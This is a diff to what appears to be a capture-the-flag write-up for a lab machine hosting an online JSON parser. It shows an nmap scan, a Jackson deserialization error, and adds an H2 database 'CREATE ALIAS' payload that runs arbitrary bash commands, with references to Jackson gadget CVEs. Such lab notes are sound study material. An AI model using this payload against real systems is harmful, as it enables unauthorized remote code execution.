@@ -1,8 +1,8 @@
 
 
 
-# time
 
+# time
 
 ```bash
 nmap -sC -sV 10.129.32.8
@@ -17,9 +17,6 @@ PORT   STATE SERVICE VERSION
 |_http-title: Online JSON parser
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
-grace@kali:~$ 
 
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input
 
@@ -186,13 +183,28 @@ puts "stringified: " + mapper.writeValueAsString(obj)
 ```
 
 
+```sql
+-- CREATE ALIAS SHELLEXEC
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\A");
+    return s.hasNext() ? s.next() : "";  }
+$$;
+
+-- CALL ALIAS SHELLEXEC with iput
+CALL SHELLEXEC('id > exploited.txt')
+```
+
+
 
 ---
 
 ref
 - [Abusing H2 Database ALIAS](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
 - [java.vul](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
-- [exploit](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
+- [On Jackson CVEs: Don’t Panic — Here is what you need to know](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
+- [CVE](https://www.cvedetails.com/cve/CVE-2017-7525/)
+- [$$](https://stackoverflow.com/questions/12144284/what-are-used-for-in-pl-pgsql)
 
 
 
